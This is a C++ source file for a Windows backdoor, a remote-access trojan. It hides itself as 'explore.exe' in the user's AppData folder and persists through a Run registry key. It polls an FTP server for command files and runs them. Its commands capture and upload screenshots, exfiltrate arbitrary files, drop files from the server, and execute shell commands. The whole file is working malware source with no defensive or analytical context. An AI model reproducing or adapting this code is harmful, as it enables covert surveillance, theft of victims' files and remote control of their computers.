#include "Backdoor.h"

Backdoor::Backdoor(const std::string &host, const std::string &username, const std::string &password)
	: ftp_host(host), ftp_username(username), ftp_password(password),
	  ftp_connection(FtpConnect(ftp_host, ftp_username, ftp_password)),
	  win_username(WinWrapper::get_username()),
	  store_path("C:\\Users\\" + win_username + "\\AppData\\Local\\SystemConnection"),
	  data_path((std::filesystem::path(store_path) / "data").u8string()),
	  app_path((std::filesystem::path(store_path) / "app").u8string()),
	  output_path((std::filesystem::path(data_path) / "output.txt").u8string())
{
}

Backdoor::~Backdoor()
{
}

void Backdoor::start()
{
	// 1) check if has started before
	if (!std::filesystem::exists(store_path))
		setup(); // 2) if not --> setup

	// 3) connect to ftp
	ftp_connection.connect();
	
	// 4) change dir to username if not exists mkdir
	if (!ftp_connection.cd(win_username)) {
		ftp_connection.mkdir(win_username);
		ftp_connection.cd(win_username);
	}
		
	// 5) download the script file and compile it
	std::string file_path = (std::filesystem::path(app_path) / "cmd.txt").u8string();
	
	if (ftp_connection.retr_file(file_path, "cmd.txt")) {
		Sleep(1500); // for getting the file
		compile(file_path);
	}


	ftp_connection.upload_file(output_path, "output.txt");
	Sleep(2000);
}

void Backdoor::setup()
{
	std::filesystem::create_directory(store_path);
	std::filesystem::create_directory(data_path);
	std::filesystem::create_directory(app_path);

	add_to_reg();
}

void Backdoor::compile(const std::string &file_path)
{
	std::string code = WinWrapper::read_file(file_path);
	std::stringstream ss_code(code);
	std::string line;

	while (std::getline(ss_code, line))
	{
		try {

			std::vector<std::string> spl_line;
			std::stringstream ss_line(line);
			std::string command;

			while (std::getline(ss_line, command, ' ')) {
				spl_line.push_back(command);
			}


			execute(spl_line);
		}
		catch (...) {
			continue;
		}
	}


}

void Backdoor::execute(const std::vector<std::string>& spl_line)
{
	try {

		std::string main_cmd = spl_line[0];

		if (main_cmd == "print") {

			if (spl_line.size() < 2) {
				WinWrapper::append_file(output_path, "[!] Error [!]\n\n");
				return;
			}

			WinWrapper::append_file(output_path, "[>] " + spl_line[1] + " [<]\n\n");
		}
		else if (main_cmd == "screen") {

			if (spl_line.size() < 2) {
				WinWrapper::append_file(output_path, "[!] Error [!]\n\n");
				return;
			}

			int counter = std::stoi(spl_line[1]);

			if (!ftp_connection.cd("screens")) {
				ftp_connection.mkdir("screens");
				ftp_connection.cd("screens");
			}

			for (int i = 0; i < counter; ++i)
			{
				std::string screenshot_path = WinWrapper::screenshot(data_path);
				Sleep(500);
				ftp_connection.upload_file(screenshot_path, std::filesystem::path(screenshot_path).filename().u8string());
				Sleep(1000);
				WinWrapper::append_file(output_path, "[-] Screenhost done >> " + screenshot_path + " [-]\n\n");
			}

			ftp_connection.cd("../");
		}
		else if (main_cmd == "upload") {

			if (spl_line.size() < 3) {
				WinWrapper::append_file(output_path, "[!] Error [!]\n\n");
				return;
			}

			if (!ftp_connection.cd("uploads")) {
				WinWrapper::append_file(output_path, "[!] Uploads folder not found [!]\n\n");
				return;
			}

			if (ftp_connection.retr_file(spl_line[2], spl_line[1]))
				WinWrapper::append_file(output_path, "[-] Sucessfully uploaded file [-]\n\n");
			else
				WinWrapper::append_file(output_path, "[!] Error while uploading file [!]\n\n");

			ftp_connection.cd("../");

		}
		else if (main_cmd == "download") {

			if (spl_line.size() < 2) {
				WinWrapper::append_file(output_path, "[!] Error [!]\n\n");
				return;
			}

			if (!ftp_connection.cd("downloads")) {
				ftp_connection.mkdir("downloads");
				ftp_connection.cd("downloads");
			}

			if (ftp_connection.upload_file(spl_line[1], std::filesystem::path(spl_line[1]).filename().u8string()))
				WinWrapper::append_file(output_path, "[-] Sucessfully downloaded file [-]\n\n");
			else
				WinWrapper::append_file(output_path, "[!] Error while downloading file [!]\n\n");

			ftp_connection.cd("../");
		}
		else if (main_cmd == "exec")
		{
			if (spl_line.size() < 2) {
				WinWrapper::append_file(output_path, "[!] Error [!]\n\n");
				return;
			}

			WinExec(std::string("cmd \"d:" + spl_line[1] + "f\"").c_str(), 0);
		}
		else {
			WinWrapper::append_file(output_path, "[!] Command: " + main_cmd + " not found [!]\n\n");
		}

	}
	catch (...)
	{
		WinWrapper::append_file(output_path, "[!] Error [!]\n\n");
	}

}


void Backdoor::add_to_reg()
{
	std::string cmd = "";
	WCHAR path[MAX_PATH];

	int len = GetModuleFileNameW(NULL, path, MAX_PATH);
	std::string new_path;
	std::string dest = (std::filesystem::path(store_path) / "explore.exe").u8string();

	for (int i = 0; i < len; ++i)
		new_path += path[i];

	std::filesystem::copy_file(new_path, dest);

	system(std::string("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysConnection  /t REG_SZ /d \"" + dest + "\"").c_str());
}
